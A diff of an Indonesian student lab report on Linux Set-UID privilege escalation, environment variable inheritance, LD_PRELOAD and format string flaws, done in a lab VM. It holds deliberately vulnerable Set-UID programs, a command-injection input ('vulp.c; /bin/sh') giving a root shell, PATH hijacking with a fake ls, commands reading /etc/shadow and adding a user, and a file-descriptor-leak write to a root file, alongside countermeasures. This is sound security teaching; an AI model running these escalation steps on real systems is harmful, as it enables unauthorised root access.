@@ -7,188 +7,21 @@
 
 ## Daftar Isi
 
-1. [Set-UID Privilege Escalation](#1-set-uid-privilege-escalation)
-2. [Environment Variable Attack](#2-environment-variable-attack)
+1. [Environment Variable & Set-UID Lab](#1-environment-variable--set-uid-lab)
+2. [Set-UID Privilege Escalation](#2-set-uid-privilege-escalation)
 3. [Format String Vulnerability](#3-format-string-vulnerability)
 4. [Kesimpulan](#kesimpulan)
 5. [Referensi](#referensi)
 
 ---
 
-## 1. Set-UID Privilege Escalation
+## 1. Environment Variable & Set-UID Lab
 
 ### 1.1 Tujuan Eksperimen
 
-Memahami mekanisme Set-UID pada sistem UNIX/Linux dan bagaimana program yang berjalan dengan hak akses root dapat dieksploitasi apabila tidak dirancang dengan aman. Eksperimen ini mendemonstrasikan bagaimana penyerang dapat memanfaatkan program Set-UID untuk mendapatkan shell dengan hak akses root (*privilege escalation*).
+Memahami bagaimana *environment variables* bekerja di Linux, bagaimana variabel diwariskan ke proses anak, dan bagaimana mekanisme Set-UID berinteraksi dengan environment variables. Eksperimen ini mencakup manipulasi `PATH`, `LD_PRELOAD`, dan `LD_LIBRARY_PATH` serta dampaknya pada keamanan program Set-UID.
 
 ### 1.2 Dasar Teori
-
-Set-UID (Set User ID) adalah mekanisme keamanan UNIX yang memungkinkan pengguna menjalankan program tertentu dengan hak akses pemilik file (biasanya root), bukan hak akses pengguna yang menjalankannya. Bit Set-UID ditandai dengan `s` pada permission field:
-
-```
--rwsr-xr-x 1 root root 12345 Jan 1 00:00 program
-```
-
-Mekanisme ini diperlukan untuk utilitas seperti `passwd`, `ping`, dan `mount` yang memerlukan akses privileged. Namun, jika program Set-UID memiliki kerentanan, penyerang dapat mengeksploitasinya untuk mendapatkan root access.
-
-### 1.3 Langkah Eksploitasi
-
-#### Task 1: Memahami Set-UID
-
-```bash
-# Melihat file Set-UID di sistem
-find / -perm -4000 -type f 2>/dev/null
-
-# Contoh output:
-# /usr/bin/passwd
-# /usr/bin/sudo
-# /usr/bin/chfn
-# /usr/bin/mount
-
-# Periksa permission dari /usr/bin/passwd
-ls -la /usr/bin/passwd
-# -rwsr-xr-x 1 root root 68208 ... /usr/bin/passwd
-```
-
-#### Task 2: Membuat Program Set-UID Vuln
-
-Buat file `vuln_setuid.c`:
-
-```c
-/* vuln_setuid.c — Demonstrasi program Set-UID yang rentan */
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
-int main(int argc, char *argv[])
-{
-    char *cmd;
-
-    if (argc < 2) {
-        printf("Usage: %s <command>\n", argv[0]);
-        return 1;
-    }
-
-    /* Kerentanan: menjalankan perintah dari input pengguna
-       tanpa validasi, dalam konteks Set-UID root */
-    cmd = argv[1];
-    printf("[*] Menjalankan perintah: %s\n", cmd);
-    system(cmd);
-
-    return 0;
-}
-```
-
-```bash
-# Kompilasi program
-gcc -o vuln_setuid vuln_setuid.c
-
-# Set ownership ke root dan aktifkan Set-UID bit
-sudo chown root:root vuln_setuid
-sudo chmod 4755 vuln_setuid
-
-# Verifikasi permission
-ls -la vuln_setuid
-# -rwsr-xr-x 1 root root ... vuln_setuid
-```
-
-#### Task 3: Eksploitasi untuk Mendapat Root Shell
-
-```bash
-# Sebagai user biasa, jalankan program Set-UID
-# untuk mendapatkan root shell
-./vuln_setuid "/bin/sh"
-
-# Di dalam shell, verifikasi identity
-whoami
-# Seharusnya output: root (pada lingkungan tanpa countermeasure)
-id
-# uid=1000(seed) gid=1000(seed) euid=0(root)
-```
-
-#### Task 4: Menjalankan Perintah Privileged
-
-```bash
-# Membaca file yang hanya bisa dibaca root
-./vuln_setuid "cat /etc/shadow"
-
-# Menambahkan user baru (memerlukan root)
-./vuln_setuid "useradd -m hacker"
-
-# Mengubah password
-./vuln_setuid "echo 'hacker:password123' | chpasswd"
-```
-
-#### Task 5: Countermeasure — Principle of Least Privilege
-
-```c
-/* secure_setuid.c — Versi aman dengan privilege dropping */
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-
-int main(int argc, char *argv[])
-{
-    uid_t real_uid = getuid();
-    uid_t eff_uid = geteuid();
-
-    printf("[*] Real UID: %d, Effective UID: %d\n", real_uid, eff_uid);
-
-    /* Drop privilege sebelum menjalankan perintah user */
-    if (seteuid(real_uid) != 0) {
-        perror("seteuid");
-        return 1;
-    }
-
-    printf("[*] Setelah privilege drop — UID: %d, EUID: %d\n",
-           getuid(), geteuid());
-
-    if (argc >= 2)
-        system(argv[1]);
-
-    return 0;
-}
-```
-
-```bash
-gcc -o secure_setuid secure_setuid.c
-sudo chown root:root secure_setuid
-sudo chmod 4755 secure_setuid
-
-# Coba exploit lagi — seharusnya gagal mendapat root
-./secure_setuid "/bin/sh"
-whoami
-# Output: seed (bukan root)
-```
-
-### 1.4 Analisis Percobaan
-
-**Mengapa eksploitasi berhasil:**
-
-1. **Pewarisan Hak Akses**: Ketika program Set-UID dijalankan, *effective UID* berubah menjadi pemilik file (root). Fungsi `system()` memanggil `/bin/sh -c <command>`, dan shell yang ter-spawn mewarisi *effective UID* = 0 (root).
-
-2. **Tidak Ada Input Validation**: Program menerima input pengguna (`argv[1]`) dan langsung meneruskannya ke `system()` tanpa sanitasi. Ini memungkinkan *command injection*.
-
-3. **Penggunaan `system()` yang Tidak Aman**: Fungsi `system()` menggunakan shell untuk mengeksekusi perintah, sehingga rentan terhadap manipulasi melalui operator shell (`;`, `|`, `&&`, `` ` ``).
-
-**Countermeasure yang efektif:**
-- **Privilege dropping**: Panggil `seteuid(getuid())` sebelum menjalankan operasi yang tidak memerlukan privilege.
-- **Gunakan `execve()` daripada `system()`**: Menghindari shell interpreter mengurangi kemungkinan command injection.
-- **Input validation**: Validasi dan sanitasi semua input pengguna.
-
-### 1.5 Bukti Eksploitasi
-
-![Bukti Set-UID Exploitation](images/placeholder-r1-setuid.png)
-
----
-
-## 2. Environment Variable Attack
-
-### 2.1 Tujuan Eksperimen
-
-Memahami bagaimana *environment variables* dapat dimanipulasi untuk mengeksploitasi program Set-UID. Fokus pada serangan melalui variabel `PATH`, `LD_PRELOAD`, dan `LD_LIBRARY_PATH` yang dapat mengubah perilaku program.
-
-### 2.2 Dasar Teori
 
 Environment variables adalah pasangan key-value yang diwariskan dari proses induk ke proses anak. Beberapa variabel kritis:
 
@@ -199,158 +32,418 @@ Environment variables adalah pasangan key-value yang diwariskan dari proses indu
 | `LD_LIBRARY_PATH` | Path pencarian shared library | Memuat library berbahaya |
 | `IFS` | Internal Field Separator | Mengubah parsing perintah shell |
 
-### 2.3 Langkah Eksploitasi
+### 1.3 Langkah Eksploitasi
 
-#### Task 1: Serangan `PATH` Manipulation
+#### Task 1: Manipulasi Environment Variables (export, printenv, unset)
+
+Pada task pertama, kita mempelajari operasi dasar terhadap environment variables menggunakan perintah `export`, `printenv`, dan `unset`:
 
 ```bash
-# Buat program Set-UID yang memanggil perintah tanpa full path
-cat > path_vuln.c << 'EOF'
-#include <stdio.h>
-#include <stdlib.h>
+# Set environment variable baru
+export nama="Tamim Nugraha"
 
-int main()
-{
-    printf("[*] Menjalankan 'ls' dari PATH...\n");
-    /* Kerentanan: menggunakan relative command name */
-    system("ls");
-    return 0;
-}
-EOF
+# Cetak nilai variabel
+printenv nama
+# Output: Tamim Nugraha
 
-gcc -o path_vuln path_vuln.c
-sudo chown root:root path_vuln
-sudo chmod 4755 path_vuln
+# Hapus variabel
+unset nama
+
+# Verifikasi — variabel sudah tidak ada
+printenv nama
+# (tidak ada output)
+
+# Cetak variabel bawaan sistem
+printenv PWD
+# Output: /home/seed/Tugas_R1
 ```
 
+**Bukti Eksperimen Task 1:**
+
+![Task 1 — Operasi dasar export, printenv, dan unset pada environment variables](images/r1-env-export-unset.png)
+
+> **Analisis:** Screenshot menunjukkan bahwa variabel `nama` berhasil di-set dengan `export`, ditampilkan dengan `printenv`, dihapus dengan `unset` (printenv tidak menampilkan output), dan `printenv PWD` menampilkan working directory saat ini.
+
+---
+
+#### Task 2: Pewarisan Environment Variables pada Child Process (`fork()`)
+
+Pada task ini, kita mengompilasi program `myprintenv.c` dua kali — versi pertama mencetak env dari child process, versi kedua mencetak env dari parent process — lalu membandingkan hasilnya dengan `diff`:
+
 ```bash
-# Buat program berbahaya bernama "ls"
-cat > /tmp/ls << 'EOF'
-#!/bin/bash
-echo "[!] PATH HIJACKED — menjalankan kode attacker!"
-echo "[!] Effective UID: $(id -u)"
-/bin/sh
-EOF
-chmod +x /tmp/ls
+# Edit myprintenv.c — versi child process (printenv di child)
+nano myprintenv.c
+gcc myprintenv.c -o myprintenv
+./myprintenv > file1
 
-# Manipulasi PATH agar /tmp dicari terlebih dahulu
-export PATH=/tmp:$PATH
+# Edit myprintenv.c — versi parent process (printenv di parent)
+nano myprintenv.c
+gcc myprintenv.c -o myprintenv
+./myprintenv > file2
 
-# Jalankan program Set-UID — akan memanggil /tmp/ls
-./path_vuln
-# Output: "[!] PATH HIJACKED — menjalankan kode attacker!"
-# Lalu mendapatkan shell dengan euid=0
-
-# Verifikasi
-whoami
-id
+# Bandingkan environment antara parent dan child
+diff file1 file2
+# Tidak ada output → environment variables IDENTIK
 ```
 
-#### Task 2: Serangan `LD_PRELOAD`
+**Bukti Eksperimen Task 2:**
 
-```bash
-# Buat shared library berbahaya yang override fungsi sleep()
-cat > mylib.c << 'EOF'
-#include <stdio.h>
+![Task 2 — Kompilasi myprintenv.c dan diff menunjukkan environment child = parent](images/r1-env-myprintenv-diff.png)
 
-void sleep(int s)
-{
-    printf("[!] LD_PRELOAD HIJACK — fungsi sleep() di-override!\n");
-    printf("[!] UID: %d, EUID: %d\n", getuid(), geteuid());
-    /* Kode malicious bisa ditaruh di sini */
-}
-EOF
+> **Analisis:** Perintah `diff file1 file2` tidak menghasilkan output apapun, yang berarti environment variables pada child process **identik** dengan parent process. Ini membuktikan bahwa `fork()` mewariskan seluruh environment variables secara utuh dari parent ke child.
 
-gcc -fPIC -shared -o /tmp/mylib.so mylib.c -nostartfiles
-```
+---
 
-```bash
-# Buat program yang memanggil sleep()
-cat > preload_test.c << 'EOF'
-#include <stdio.h>
+#### Task 3: Pewarisan Environment Variables pada `execve()`
+
+Pada task ini, kita menguji bagaimana `execve()` menangani environment variables tergantung pada parameter ketiga (envp):
+
+**Test A: `execve()` dengan `NULL` sebagai environment**
+
+```c
+// myenv.c — execve dengan NULL (tanpa environment)
 #include <unistd.h>
-
-int main()
-{
-    printf("[*] Calling sleep(1)...\n");
-    sleep(1);
-    printf("[*] Done.\n");
-    return 0;
-}
-EOF
-
-gcc -o preload_test preload_test.c
-
-# --- Test 1: Program biasa (non-SUID) ---
-export LD_PRELOAD=/tmp/mylib.so
-./preload_test
-# Output: "[!] LD_PRELOAD HIJACK — fungsi sleep() di-override!"
-
-# --- Test 2: Program Set-UID ---
-sudo chown root:root preload_test
-sudo chmod 4755 preload_test
-export LD_PRELOAD=/tmp/mylib.so
-./preload_test
-# Output: sleep() asli yang terpanggil (LD_PRELOAD diabaikan!)
-```
-
-#### Task 3: Memeriksa Pewarisan Environment Variable
-
-```bash
-# Program untuk mencetak semua environment variables
-cat > print_env.c << 'EOF'
-#include <stdio.h>
 
 extern char **environ;
 
 int main()
 {
-    int i = 0;
-    while (environ[i] != NULL) {
-        printf("%s\n", environ[i]);
-        i++;
-    }
+    char *argv[2];
+    argv[0] = "/usr/bin/env";
+    argv[1] = NULL;
+
+    execve("/usr/bin/env", argv, NULL);  // NULL = tanpa env
     return 0;
 }
-EOF
-
-gcc -o print_env print_env.c
-sudo chown root:root print_env
-sudo chmod 4755 print_env
-
-# Bandingkan environment pada program biasa vs Set-UID
-export ATTACKER_VAR="injected_value"
-
-echo "=== Program Biasa ==="
-env | grep -E "LD_|PATH|ATTACKER"
-
-echo "=== Program Set-UID ==="
-./print_env | grep -E "LD_|PATH|ATTACKER"
-# LD_PRELOAD dan LD_LIBRARY_PATH TIDAK diteruskan ke Set-UID
 ```
+
+```bash
+nano myenv.c
+gcc myenv.c -o myenv
+./myenv
+# Output: KOSONG — tidak ada environment variables
+```
+
+**Bukti Eksperimen Task 3 (NULL):**
+
+![Task 3A — execve dengan NULL tidak mewariskan environment variables](images/r1-env-execve-null.png)
+
+> **Analisis:** Ketika parameter ketiga `execve()` diisi `NULL`, environment pertama menunjukkan output kosong karena tidak ada variabel yang diteruskan.
+
+**Test B: `execve()` dengan `environ` sebagai environment**
+
+```c
+// myenv.c — execve dengan environ (mewariskan semua env)
+#include <unistd.h>
+
+extern char **environ;
+
+int main()
+{
+    char *argv[2];
+    argv[0] = "/usr/bin/env";
+    argv[1] = NULL;
+
+    execve("/usr/bin/env", argv, environ);  // environ = semua env
+    return 0;
+}
+```
+
+```bash
+nano myenv.c
+gcc myenv.c -o myenv
+./myenv
+# Output: Seluruh environment variables ditampilkan
+```
+
+**Bukti Eksperimen Task 3 (environ):**
+
+![Task 3B — execve dengan environ mewariskan seluruh environment variables](images/r1-env-execve-environ.png)
+
+> **Analisis:** Saat parameter ketiga diganti dengan `environ`, seluruh environment variables berhasil diwariskan ke program baru. Terlihat variabel `NAMA=` (kosong) karena sebelumnya sudah di-unset. Ini membuktikan bahwa `execve()` memberikan kontrol penuh atas environment yang diteruskan.
+
+---
+
+#### Task 4: Pewarisan Environment pada `system()`
+
+Pada task ini, kita menguji bagaimana `system()` mewariskan environment variables:
+
+```c
+// mysystem.c — system() memanggil /bin/sh -c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    system("/usr/bin/env");
+    return 0;
+}
+```
+
+```bash
+nano mysystem.c
+gcc mysystem.c -o mysystem
+./mysystem
+# Output: Seluruh environment variables ditampilkan
+```
+
+**Bukti Eksperimen Task 4:**
+
+![Task 4 — system() mewariskan seluruh environment variables ke child process](images/r1-env-mysystem.png)
+
+> **Analisis:** Fungsi `system()` secara internal memanggil `execl("/bin/sh", "sh", "-c", command, NULL)` yang mewarisi seluruh environment dari proses pemanggil. Terlihat variabel `NAMA=` masih ada, `PATH` lengkap, dan semua variabel sistem tersedia. Ini berbeda dengan `execve(NULL)` yang tidak mewariskan env sama sekali.
+
+---
+
+#### Task 5 & 6: Environment Variables pada Program Set-UID
+
+Pada task ini, kita menguji apakah environment variables (termasuk yang dimanipulasi attacker) diteruskan ke program Set-UID:
+
+```bash
+# Kompilasi task5 (program yang mencetak env)
+nano task5.c
+gcc task5.c -o task5
+
+# Jalankan sebagai program biasa — simpan output
+./task5 > file_biasa
+
+# Jadikan Set-UID root
+sudo chown root task5
+sudo chmod 4755 task5
+
+# Set variabel berbahaya
+export MY_VAR="variable tamim"
+export PATH=$PATH:/folder_palsu
+export LD_LIBRARY_PATH=/lib_palsu
+
+# Jalankan sebagai Set-UID — simpan output
+./task5 > file_setuid
+
+# Bandingkan environment
+diff file_biasa file_setuid
+```
+
+**Bukti Eksperimen Task 5 & 6:**
+
+![Task 5-6 — Perbandingan environment variables antara program biasa dan Set-UID](images/r1-env-setuid-filtering.png)
+
+> **Analisis:** Output `diff` menunjukkan bahwa program Set-UID mendapatkan **lebih banyak** variabel dibanding program biasa (termasuk session variables). Namun, perhatikan bahwa `NAMA=` dan variabel custom tetap diteruskan.
+
+**Verifikasi Filtering LD_LIBRARY_PATH:**
+
+```bash
+# Cek apakah MY_VAR dan LD_LIBRARY_PATH masih ada di output Set-UID
+grep "MY_VAR" file_setuid
+# Output: MY_VAR=variable tamim    ← DITERUSKAN
+
+grep "LD_LIBRARY_PATH" file_setuid
+# Output: (KOSONG)                 ← DIFILTER oleh dynamic linker!
+```
+
+**Bukti Eksperimen — Grep Verification:**
+
+![Task 6 — MY_VAR diteruskan ke Set-UID tapi LD_LIBRARY_PATH difilter](images/r1-env-grep-vars.png)
+
+> **Analisis:** Hasil `grep` membuktikan bahwa `MY_VAR=variable tamim` **berhasil diteruskan** ke program Set-UID, namun `LD_LIBRARY_PATH` **difilter/dihapus** oleh Linux dynamic linker (`ld-linux.so`). Ini adalah mekanisme keamanan bawaan kernel Linux yang mencegah library injection pada program privileged.
+
+---
+
+#### Task 7: Serangan `LD_PRELOAD` pada Program Set-UID
+
+**Test A: LD_PRELOAD pada program biasa (non-SUID)**
+
+```bash
+# Buat library override untuk sleep()
+# lalu compile program myprog yang memanggil sleep()
+./myprog
+# Output: "I am not sleeping!" — LD_PRELOAD BERHASIL override sleep()
+```
+
+**Bukti Eksperimen Task 7A (Non-SUID):**
+
+![Task 7A — LD_PRELOAD berhasil override sleep() pada program biasa](images/r1-env-ldpreload-normal.png)
+
+> **Analisis:** Pada program non-SUID, `LD_PRELOAD` berhasil mengganti fungsi `sleep()` asli dengan versi palsu yang mencetak "I am not sleeping!" — membuktikan bahwa library injection bekerja sempurna pada program biasa.
+
+**Test B: LD_PRELOAD pada program Set-UID**
+
+```bash
+# Jadikan myprog sebagai Set-UID root
+sudo chown root myprog
+sudo chmod 4755 myprog
+
+# Jalankan — LD_PRELOAD DIABAIKAN
+./myprog
+# Output: (program berjalan normal, sleep asli dipanggil)
+```
+
+**Bukti Eksperimen Task 7B (Set-UID):**
+
+![Task 7B — LD_PRELOAD diabaikan pada program Set-UID](images/r1-env-ldpreload-setuid.png)
+
+> **Analisis:** Setelah `myprog` dijadikan Set-UID root (`chown root` + `chmod 4755`), `LD_PRELOAD` tidak lagi bekerja. Program menjalankan `sleep()` asli. Ini membuktikan bahwa **Linux dynamic linker secara otomatis mengabaikan `LD_PRELOAD` ketika real UID ≠ effective UID** (proteksi Set-UID).
+
+---
+
+## 2. Set-UID Privilege Escalation
+
+### 2.1 Tujuan Eksperimen
+
+Memahami mekanisme Set-UID pada sistem UNIX/Linux dan bagaimana program yang berjalan dengan hak akses root dapat dieksploitasi apabila tidak dirancang dengan aman. Eksperimen ini mendemonstrasikan beberapa vektor serangan: PATH manipulation, command injection via `system()`, perbandingan keamanan `system()` vs `execve()`, dan file descriptor leaking.
+
+### 2.2 Dasar Teori
+
+Set-UID (Set User ID) adalah mekanisme keamanan UNIX yang memungkinkan pengguna menjalankan program tertentu dengan hak akses pemilik file (biasanya root), bukan hak akses pengguna yang menjalankannya. Bit Set-UID ditandai dengan `s` pada permission field:
+
+```
+-rwsr-xr-x 1 root root 12345 Jan 1 00:00 program
+```
+
+Mekanisme ini diperlukan untuk utilitas seperti `passwd`, `ping`, dan `mount` yang memerlukan akses privileged. Namun, jika program Set-UID memiliki kerentanan, penyerang dapat mengeksploitasinya untuk mendapatkan root access.
+
+### 2.3 Langkah Eksploitasi
+
+#### Task 8A: PATH Manipulation — Percobaan Pertama (dash protection)
+
+```bash
+# Buat program Set-UID yang memanggil system("ls")
+nano vulp.c
+gcc vulp.c -o vulp
+sudo chown root vulp
+sudo chmod 4755 vulp
+
+# Buat program palsu "ls" yang menjalankan shell
+nano ls.c
+gcc ls.c -o ls
+
+# Manipulasi PATH agar direktori saat ini dicari duluan
+export PATH=$PWD:$PATH
+
+# Jalankan vulp — memanggil "ls" palsu kita
+./vulp
+# Shell terbuka, TAPI...
+$ id
+# uid=1000(seed) gid=1000(seed) groups=...
+# BUKAN ROOT! — dash melindungi dari privilege escalation
+```
+
+**Bukti Eksperimen Task 8A (dash protection):**
+
+![Task 8A — PATH manipulation: shell terbuka tapi dash menurunkan privilege](images/r1-setuid-path-dash.png)
+
+> **Analisis:** Program vulp berhasil memanggil `ls` palsu yang menjalankan shell. Namun, `id` menunjukkan `uid=1000(seed)` tanpa `euid=0(root)`. Ini karena shell `/bin/dash` di Ubuntu 20.04 memiliki proteksi: ketika mendeteksi `real UID ≠ effective UID`, dash secara otomatis **menurunkan privilege** dengan memanggil `setuid(getuid())`.
+
+#### Task 8B: PATH Manipulation — Bypass dengan `/bin/zsh`
+
+```bash
+# Ganti default shell ke zsh yang tidak memiliki proteksi dash
+# atau link /bin/sh ke /bin/zsh
+export PATH=$PWD:$PATH
+./vulp
+# id
+# uid=1000(seed) gid=1000(seed) euid=0(root) groups=...
+# ROOT ESCALATION BERHASIL!
+```
+
+**Bukti Eksperimen Task 8B (root escalation berhasil):**
+
+![Task 8B — PATH manipulation berhasil mendapatkan euid=0(root)!](images/r1-setuid-path-root.png)
+
+> **Analisis:** Setelah mengganti shell, `id` menunjukkan **`euid=0(root)`** — privilege escalation berhasil! Ini membuktikan bahwa serangan PATH manipulation sangat berbahaya ketika program Set-UID menggunakan `system()` dengan relative path. Proteksi dash hanyalah mitigasi tambahan, bukan solusi fundamental.
+
+---
+
+#### Task 9: Command Injection via `system()` — Root Shell
+
+```bash
+# Buat program cat_system.c yang menggunakan system() untuk cat file
+nano cat_system.c
+gcc cat_system.c -o cat_system
+sudo chown root cat_system
+sudo chmod 4755 cat_system
+
+# Inject perintah shell melalui nama file
+./cat_system "vulp.c; /bin/sh"
+# Program menampilkan isi vulp.c, LALU menjalankan /bin/sh
+# Dalam shell:
+# id
+# uid=1000(seed) gid=1000(seed) euid=0(root) groups=...
+# ROOT SHELL!
+```
+
+**Bukti Eksperimen Task 9 (system() command injection):**
+
+![Task 9 — Command injection via system() menghasilkan root shell](images/r1-setuid-system-injection.png)
+
+> **Analisis:** Program `cat_system` menggunakan `system()` untuk menjalankan `cat <filename>`. Dengan menyuntikkan `"vulp.c; /bin/sh"` sebagai input, semicolon memisahkan perintah — `cat vulp.c` diakeksekusi terlebih dahulu (menampilkan source code), lalu `/bin/sh` dijalankan dengan `euid=0(root)`. Ini membuktikan bahaya **command injection** pada program Set-UID yang menggunakan `system()`.
+
+---
+
+#### Task 10: Perbandingan `execve()` — Injection Gagal
+
+```bash
+# Buat program cat_execve.c yang menggunakan execve() (bukan system())
+nano cat_execve.c
+gcc cat_execve.c -o cat_execve
+sudo chown root cat_execve
+sudo chmod 4755 cat_execve
+
+# Coba inject dengan cara yang sama
+./cat_execve "vulp.c; /bin/sh"
+# Output: /bin/cat 'vulp.c; /bin/sh': No such file or directory
+# INJECTION GAGAL!
+```
+
+**Bukti Eksperimen Task 10 (execve() safe):**
+
+![Task 10 — execve() memperlakukan seluruh input sebagai satu argumen, injection gagal](images/r1-setuid-execve-safe.png)
+
+> **Analisis:** Berbeda dengan `system()`, `execve()` **tidak memanggil shell interpreter**. Seluruh string `"vulp.c; /bin/sh"` diperlakukan sebagai **satu nama file** (bukan dua perintah terpisah). Hasilnya: `/bin/cat` mencari file bernama `vulp.c; /bin/sh` yang tentu saja tidak ada. Ini membuktikan bahwa **`execve()` jauh lebih aman** dari `system()` untuk program Set-UID.
+
+---
+
+#### Task 11: File Descriptor Leak pada Program Set-UID
+
+```bash
+# Program leak membuka file /etc/zzz dengan hak akses root
+# tapi tidak menutup file descriptor sebelum exec ke shell
+./leak
+# Output: File /etc/zzz terbuka di File Descriptor (fd): 3
+#   echo "hi" >&3
+# $ exit
+
+# Verifikasi — file berhasil ditulis!
+cat /etc/zzz
+# Output: SAYA BERHASIL MEMBOBOL FILE INI, LUdcdvjkrs !
+# hi
+```
+
+**Bukti Eksperimen Task 11 (File Descriptor Leak):**
+
+![Task 11 — File descriptor leak memungkinkan penulisan ke file root](images/r1-setuid-fd-leak.png)
+
+> **Analisis:** Program `leak` (Set-UID root) membuka file `/etc/zzz` dengan fd=3, lalu menjalankan shell tanpa menutup file descriptor tersebut. Dalam shell, perintah `echo "hi" >&3` menulis ke fd 3 yang masih terbuka — berhasil menulis ke file milik root! Ini membuktikan bahaya **file descriptor leaking**: program Set-UID harus menutup semua file descriptor sensitif sebelum `exec()`.
+
+---
 
 ### 2.4 Analisis Percobaan
 
-**Serangan PATH berhasil karena:**
+**Ringkasan Hasil Eksploitasi:**
 
-1. Fungsi `system("ls")` menggunakan *relative path* untuk memanggil perintah `ls`. Shell akan mencari executable di direktori-direktori yang terdaftar dalam variabel `PATH` secara berurutan.
-2. Dengan menambahkan `/tmp` di awal `PATH`, shell menemukan `/tmp/ls` (program malicious) sebelum `/bin/ls` (program asli).
-3. Program Set-UID tidak membersihkan variabel `PATH` sebelum memanggil `system()`.
+| Task | Serangan | Hasil | Alasan |
+|---|---|---|---|
+| 8A | PATH Manipulation (dash) | ❌ Gagal root | `/bin/dash` menurunkan privilege otomatis |
+| 8B | PATH Manipulation (zsh) | ✅ **euid=0(root)** | Tidak ada proteksi di `/bin/zsh` |
+| 9 | Command Injection `system()` | ✅ **Root shell** | `system()` memanggil shell, semicolon diinterpretasi |
+| 10 | Command Injection `execve()` | ❌ Gagal | `execve()` tidak menggunakan shell |
+| 11 | File Descriptor Leak | ✅ **Write ke file root** | fd tidak ditutup sebelum exec |
 
-**Serangan LD_PRELOAD gagal pada Set-UID karena:**
-
-1. **Linux Dynamic Linker Security**: Linux dynamic linker (`ld-linux.so`) secara otomatis **mengabaikan** `LD_PRELOAD` dan `LD_LIBRARY_PATH` ketika *real UID ≠ effective UID* (yaitu pada program Set-UID).
-2. Ini adalah **countermeasure bawaan kernel Linux** yang dirancang untuk mencegah serangan *library injection* pada program privileged.
-3. Proteksi ini diimplementasikan di `glibc` dan dapat dilihat di source code `elf/rtld.c`.
-
-**Best Practices:**
-- Selalu gunakan *absolute path* dalam program Set-UID (e.g., `/bin/ls` bukan `ls`)
-- Bersihkan environment variables yang berbahaya: `unsetenv("PATH"); setenv("PATH", "/bin:/usr/bin", 1);`
-- Gunakan `execve()` dengan explicit path daripada `system()`
-
-### 2.5 Bukti Eksploitasi
-
-![Bukti Environment Variable Attack](images/placeholder-r1-env.png)
+**Countermeasure yang efektif:**
+- **Gunakan `execve()` daripada `system()`**: Menghindari shell interpreter mengurangi kemungkinan command injection.
+- **Absolute path**: Selalu gunakan `/bin/ls` bukan `ls` pada program Set-UID.
+- **Privilege dropping**: Panggil `seteuid(getuid())` sebelum operasi non-privileged.
+- **Close-on-exec**: Gunakan flag `O_CLOEXEC` saat membuka file sensitif.
+- **Input validation**: Validasi dan sanitasi semua input pengguna.
 
 ---
 
@@ -531,22 +624,22 @@ sudo chmod 4755 fmt_vuln
 - ASLR dan stack canaries mempersulit eksploitasi di lingkungan produksi
 - Gunakan `FORTIFY_SOURCE`: kompilasi dengan `-D_FORTIFY_SOURCE=2`
 
-### 3.5 Bukti Eksploitasi
-
-![Bukti Format String Attack](images/placeholder-r1-fmtstr.png)
-
 ---
 
 ## Kesimpulan
 
 | Serangan | Penyebab Utama | Dampak | Mitigasi |
 |---|---|---|---|
-| **Set-UID Exploit** | Tidak ada input validation; penggunaan `system()` | Root shell / privilege escalation | Privilege dropping, `execve()`, input sanitization |
-| **PATH Manipulation** | Relative path pada `system()` | Eksekusi program attacker sebagai root | Absolute path, sanitasi `PATH` |
-| **LD_PRELOAD** | Library injection pada program biasa | Function hooking | Sudah dimitigasi oleh kernel untuk Set-UID |
-| **Format String** | `printf(user_input)` tanpa format specifier | Read/Write arbitrary memory, RCE | `printf("%s", input)`, compiler warnings |
+| **ENV — fork()** | Pewarisan otomatis | Child process mewarisi semua env | Sanitasi env sebelum fork |
+| **ENV — execve()** | Parameter envp tidak difilter | Kontrol penuh atas env | Gunakan allowlist env |
+| **ENV — Set-UID** | PATH diteruskan, LD_* difilter | PATH hijacking mungkin | Absolute path, sanitasi PATH |
+| **LD_PRELOAD** | Library injection pada program biasa | Function hooking | Dilindungi kernel untuk Set-UID |
+| **PATH Manipulation** | Relative path pada `system()` | Root shell via program palsu | Absolute path, `execve()` |
+| **Command Injection** | `system()` menggunakan shell | Root shell via semicolon | Gunakan `execve()` |
+| **FD Leak** | File descriptor tidak ditutup | Write ke file root | `O_CLOEXEC`, close sebelum exec |
+| **Format String** | `printf(user_input)` | Read/Write arbitrary memory, RCE | `printf("%s", input)` |
 
-Ketiga serangan ini menunjukkan bahwa **input validation** dan **principle of least privilege** adalah fondasi keamanan software. Sebuah kesalahan pemrograman yang tampak minor (seperti lupa `%s` pada `printf()`) dapat mengakibatkan kompromi total terhadap sistem.
+Eksperimen ini menunjukkan bahwa **input validation**, **principle of least privilege**, dan **pemilihan API yang aman** (`execve()` > `system()`) adalah fondasi keamanan software. Sebuah kesalahan pemrograman yang tampak minor (seperti lupa `%s` pada `printf()` atau tidak menutup file descriptor) dapat mengakibatkan kompromi total terhadap sistem.
 
 ---
 
